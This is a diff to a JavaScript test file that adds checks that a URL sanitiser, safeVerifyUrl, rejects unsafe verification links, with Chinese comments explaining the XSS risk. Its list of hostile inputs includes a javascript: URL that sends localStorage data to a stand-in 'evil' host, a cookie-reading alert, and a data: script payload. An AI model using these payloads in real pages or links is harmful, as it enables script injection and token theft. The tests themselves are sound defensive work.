@@ -6,7 +6,7 @@
  */
 import http from 'node:http'
 import assert from 'node:assert/strict'
-import { createFeedback } from '../packages/standalone/feedback.mjs'
+import { createFeedback, safeVerifyUrl } from '../packages/standalone/feedback.mjs'
 
 let failures = 0
 const check = async (name, fn) => {
@@ -60,6 +60,37 @@ try {
     const value = await feedback.start()
     assert.equal(value.userCode, 'WXYZ-9876')
     assert.equal(value.session, 'sess-1')
+  })
+
+  // verifyUrl 直接进 href 与 window.open：收集端回什么协议都必须在这里拦住，
+  // 否则被攻破的收集端就能让用户在管理页的同源里执行脚本。
+  await check('verifyUrl 只放行 https（本机收集端另允许 loopback http）', () => {
+    assert.equal(safeVerifyUrl('https://github.com/login/device'), 'https://github.com/login/device')
+    assert.equal(safeVerifyUrl('http://127.0.0.1:8080/login'), 'http://127.0.0.1:8080/login')
+    for (const hostile of [
+      'javascript:fetch("//evil/"+localStorage.ofm)',
+      'JavaScript:alert(1)',
+      'data:text/html,<script>alert(1)</script>',
+      'vbscript:msgbox(1)',
+      'file:///C:/Windows/System32/drivers/etc/hosts',
+      'http://example.com/login',
+      'https://u:p@example.com/login',
+      '',
+      null,
+      42,
+      `https://example.com/${'a'.repeat(3000)}`,
+    ]) {
+      assert.equal(safeVerifyUrl(hostile), 'https://github.com/login/device', `must reject ${String(hostile).slice(0, 40)}`)
+    }
+  })
+
+  await check('start 把收集端的恶意 verifyUrl 换成官方验证页', async () => {
+    startReply = { status: 200, body: { session: 'sess-2', userCode: 'ABCD-1234', verifyUrl: 'javascript:alert(document.cookie)', expiresIn: 900 } }
+    try {
+      const value = await feedback.start()
+      assert.equal(value.verifyUrl, 'https://github.com/login/device')
+      assert.equal(value.userCode, 'ABCD-1234', '登录仍要继续：验证码才是用户唯一能用的东西')
+    } finally { startReply = null }
   })
 
   await check('轮询 pending 不落盘令牌', async () => {
